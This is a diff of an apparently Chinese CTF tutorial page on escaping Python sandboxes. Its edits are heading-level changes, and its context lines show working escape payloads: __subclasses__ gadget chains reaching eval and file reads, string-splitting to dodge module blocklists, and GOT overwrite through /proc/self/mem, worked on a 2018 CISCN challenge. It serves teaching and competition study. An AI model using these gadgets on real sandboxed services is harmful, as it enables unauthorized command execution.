@@ -1,9 +1,9 @@
 # Python 沙盒
 所谓的 Python 沙盒，即以一定的方法模拟 Python 终端，实现用户对 Python 的使用。
 
-# Python 沙箱逃逸的一些方法
+## Python 沙箱逃逸的一些方法
 我们通常所说的 Python 沙箱逃逸就是绕过模拟的 Python 终端，最终实现命令执行。
-## 导入模块
+### 导入模块
 在 Python 的内建函数中，有一些函数可以帮助我们实现任意命令执行：
 ```
 os.system() os.popen()
@@ -52,6 +52,7 @@ eval('__import__("os").system("dir")')
 
 ```
 **platform**
+
 ```py
 import platform
 print platform.popen('dir').read()
@@ -59,7 +60,7 @@ print platform.popen('dir').read()
 
 但是，正常的 Python 沙箱会以黑名单的形式禁止使用一些模块如 os 或以白名单的形式只允许用户使用沙箱提供的模块，用以阻止用户的危险操作。而如何进一步逃逸沙箱就是我们的重点研究内容。
 
-## Python 的内建函数
+### Python 的内建函数
 当我们不能导入模块，或者想要导入的模块被禁，那么我们只能寻求 Python 本身内置函数（即通常不用人为导入，Python 本身默认已经导入的函数）。我们可以通过可以通过 `dir __builtin__` 来获取内置函数列表
 ```python
 >>> dir(__builtins__)
@@ -84,7 +85,7 @@ print platform.popen('dir').read()
 ```
 
 *如果一些 内敛函数在 __builtins__ 删除 ，我们可以通过 reload(__builtins__) 重新载入获取一个完整的 __builtins__*
-## 创建对象以及引用
+### 创建对象以及引用
 Python 的 object 类中集成了很多的基础函数，我们想要调用的时候也是可以通过创建对象进而引用。
 
 我们有常见的两个方法：
@@ -108,10 +109,10 @@ Python 的 object 类中集成了很多的基础函数，我们想要调用的�
 ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls  /var/www/html").read()' )
 ```
 
-## 间接引用
+### 间接引用
 在有些题目中，如这次的2018年国赛的 Python 沙盒题目上，import 其实整个是被阉割了。但是在 Python 中，原生的 **__import__** 是存在被引用的，只要我们找到相关对象引用就可以进一步获取我们想要的内容，具体下面的demo会讲述到
 
-## write修改got表
+### write修改got表
 实际上是一个 **/proc/self/mem** 的内存操作方法
 **/proc/self/mem** 是内存镜像，能够通过它来读写到进程的所有内存，包括可执行代码，如果我们能获取到Python一些函数的偏移，如 **system** ，我们便可以通过覆写 got 表达到 getshell的目的。
 ```py
@@ -120,7 +121,7 @@ Python 的 object 类中集成了很多的基础函数，我们想要调用的�
 第一个地址是 system 的偏移，第二个是fopen的偏移，我们可以通过 **objdump** 获取相关信息
 ![](http://oayoilchh.bkt.clouddn.com/18-5-3/25123674.jpg)
 
-# 例子
+## 例子
 2018 ciscn 全国大学生信息安全竞赛中的 Python 沙箱逃逸。
 我们可以通过`print ().__class__.__bases__[0].__subclasses__()[40]("/home/ctf/sandbox.py").read()` 获取题目源码，然后可以进一步分析，以下提供三种逃逸方法。
 ### 创建对象并利用 Python 操作字符串的特性
@@ -144,7 +145,7 @@ x.__getattribute__("func_global"+"s")['linecache'].__dict__['o'+'s'].__dict__['s
 
 print __import__.__getattribute__('__clo'+'sure__')[0].cell_contents('o'+'s').__getattribute__('sy'+'stem')('l'+'s home') 
 ```
-# 参考
+## 参考
 https://xz.aliyun.com/t/52#toc-10 
 https://blog.csdn.net/qq_35078631/article/details/78504415 
 https://www.anquanke.com/post/id/85571 
